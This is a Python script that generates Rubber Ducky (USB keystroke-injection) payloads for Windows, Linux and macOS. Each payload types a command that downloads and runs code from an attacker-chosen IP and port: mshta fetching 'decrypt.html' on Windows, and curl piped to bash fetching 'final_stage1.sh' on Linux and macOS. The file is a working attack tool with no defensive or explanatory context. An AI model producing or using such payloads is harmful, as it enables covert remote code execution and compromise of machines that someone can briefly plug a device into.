import sys

def generate_ducky(ip, port, delay_ms, output_path, os_type):
    if os_type.lower() == 'windows':
        ducky = f"""DELAY {delay_ms}
GUI r
DELAY 400
STRING mshta http://{ip}:{port}/decrypt.html
ENTER
"""
    elif os_type.lower() == 'linux':
        ducky = f"""DELAY {delay_ms}
STRING bash -c 'curl http://{ip}:{port}/final_stage1.sh | bash'
ENTER
"""
    elif os_type.lower() == 'mac':
        ducky = f"""DELAY {delay_ms}
STRING osascript -e 'do shell script "curl http://{ip}:{port}/final_stage1.sh | bash"'
ENTER
"""
    else:
        raise ValueError(f"Unsupported OS: {os_type}")

    with open(output_path, 'w') as f:
        f.write(ducky)

if __name__ == "__main__":
    if len(sys.argv) != 6:
        print("Usage: generate_ducky.py <ip> <port> <delay_ms> <output_file> <os>")
        sys.exit(1)

    ip = sys.argv[1]
    port = sys.argv[2]
    delay = sys.argv[3]
    output = sys.argv[4]
    os_type = sys.argv[5]

    generate_ducky(ip, port, delay, output, os_type)
